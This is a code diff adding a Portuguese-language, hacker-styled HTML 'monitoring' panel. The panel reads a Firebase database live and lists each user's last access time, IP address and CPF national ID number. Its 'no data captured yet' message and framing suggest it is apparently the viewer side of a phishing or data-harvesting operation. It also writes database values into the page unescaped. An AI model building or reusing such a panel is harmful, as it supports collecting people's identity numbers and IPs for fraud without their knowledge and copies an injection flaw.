@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Controle - Terminal</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            color: #00ff41;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+        }
+        .terminal {
+            border: 1px solid #333;
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+            background: #000;
+        }
+        .header {
+            border-bottom: 1px solid #333;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            color: #fff;
+        }
+        .log-entry {
+            margin-bottom: 10px;
+            padding: 5px;
+            border-left: 3px solid #00ff41;
+            background: #111;
+        }
+        .timestamp { color: #888; margin-right: 10px; }
+        .ip-address { color: #ffeb3b; margin-right: 10px; font-weight: bold; }
+        .data { color: #fff; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div class="header">
+            <h2>>_ SISTEMA DE MONITORAMENTO [ATIVA]</h2>
+        </div>
+        <div id="log-container">
+            <!-- Os dados serão carregados aqui -->
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9WtjdMj6wBsqkaPcZC9Xa9TgCpB11eho",
+            authDomain: "dados-a1d4d.firebaseapp.com",
+            databaseURL: "https://dados-a1d4d-default-rtdb.firebaseio.com",
+            projectId: "dados-a1d4d",
+            storageBucket: "dados-a1d4d.firebasestorage.app",
+            messagingSenderId: "550441905479",
+            appId: "1:550441905479:web:ff1ef4eec12a928895b062"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const logContainer = document.getElementById('log-container');
+
+        // Escuta as alterações no banco de dados em tempo real
+        const usuariosRef = ref(db, 'usuarios/');
+        onValue(usuariosRef, (snapshot) => {
+            logContainer.innerHTML = ''; // Limpa logs anteriores
+            const data = snapshot.val();
+            
+            if (data) {
+                Object.values(data).forEach(user => {
+                    const entry = document.createElement('div');
+                    entry.className = 'log-entry';
+                    entry.innerHTML = `
+                        <span class="timestamp">[${user.dataUltimoAcesso}]</span>
+                        <span class="ip-address">IP: ${user.ip}</span>
+                        <span class="data">CPF: ${user.cpf}</span>
+                    `;
+                    logContainer.appendChild(entry);
+                });
+            } else {
+                logContainer.innerHTML = '<p>Nenhum dado capturado ainda.</p>';
+            }
+        });
+    </script>
+</body>
+</html>
